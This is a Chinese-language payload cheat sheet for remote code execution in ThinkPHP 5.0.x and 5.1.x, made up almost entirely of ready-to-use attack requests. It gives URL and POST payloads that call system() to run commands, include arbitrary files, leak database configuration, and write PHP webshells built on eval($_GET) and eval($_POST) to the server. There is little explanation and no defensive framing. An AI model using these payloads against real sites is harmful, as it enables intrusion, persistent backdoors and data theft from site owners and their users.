### 漏洞影响版本： 5.0.7<=ThinkPHP5<=5.0.22 、5.1.0<=ThinkPHP<=5.1.30。不同版本 payload 需稍作调整
### 5.1.x ：
```PHP
?s=index/\think\Request/input&filter[]=system&data=pwd
?s=index/\think\view\driver\Php/display&content=<?php phpinfo();?>
?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=<?php phpinfo();?>
?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
```
### 5.0.x ：
```PHP
?s=index/think\config/get&name=database.username # 获取配置信息
?s=index/\think\Lang/load&file=../../test.jpg    # 包含任意文件
?s=index/\think\Config/load&file=../../t.php     # 包含任意.php文件
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
```
```PHP
http://localhost:8000/index.php?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
http://localhost:8000/?s=index/\think\Request/input&filter[]=system&data=pwd
```
```PHP
# ThinkPHP <= 5.0.13
POST /?s=index/index
s=whoami&_method=__construct&method=&filter[]=system

# ThinkPHP <= 5.0.23、5.1.0 <= 5.1.16 需要开启框架app_debug
POST /
_method=__construct&filter[]=system&server[REQUEST_METHOD]=ls -al

# ThinkPHP <= 5.0.23 需要存在xxx的method路由，例如captcha
POST /?s=xxx HTTP/1.1
_method=__construct&filter[]=system&method=get&get[]=ls+-al
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls
```
### 1. 利用 system 函数远程命令执行
```PHP
http://localhost:9096/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
```
### 2.通过 phpinfo 函数写出 phpinfo () 的信息
```PHP
http://localhost:9096/public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
```
### 3. 写入 shell:
```PHP
http://localhost:9096/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^%3C?php%20@eval($_GET[%22code%22])?^%3E%3Eshell.php
```
### 或者
```PHP
http://localhost:9096/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=../test.php&vars[1][]=<?php echo 'ok';?>
```
```PHP
#代码执行
?s=index/\think\Request/input&filter=phpinfo&data=1

#命令执行
?s=index/\think\Request/input&filter=system&data=系统命令

#getshell
?s=index/\think\template\driver\file/write&cacheFile=paylog.php&content=%3C?php%20eval($_POST[20208]);?%3Ehacker

#getshell2
?s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E

#代码执行
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

#命令执行
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=系统命令

#代码执行
?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

#命令执行
?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=系统命令
```